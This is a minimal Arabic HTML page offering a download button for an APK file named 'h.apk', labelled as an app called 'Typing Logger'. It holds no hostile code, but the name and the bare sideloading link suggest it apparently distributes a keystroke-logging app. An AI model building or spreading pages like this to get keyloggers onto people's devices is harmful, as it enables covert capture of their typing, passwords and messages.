<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل التطبيق</title>
    <style>
        body { 
            text-align: center; 
            padding-top: 100px; 
            font-family: Arial, sans-serif; 
            background-color: #f4f4f9;
        }
        h1 { color: #333; }
        .download-btn { 
            display: inline-block;
            background-color: #28a745; 
            color: white; 
            padding: 20px 40px; 
            text-decoration: none; 
            border-radius: 50px; 
            font-size: 22px;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: 0.3s;
        }
        .download-btn:hover {
            background-color: #218838;
            transform: scale(1.05);
        }
    </style>
</head>
<body>

    <h1>تطبيق Typing Logger</h1>
    <p>اضغط على الزر أدناه لتحميل ملف الـ APK</p>
    
    <br><br>

    <!-- الرابط الذي يطلب ملف h.apk عند الضغط عليه -->
    <a href="h.apk" class="download-btn">تحميل h.apk الآن</a>

</body>
</html>
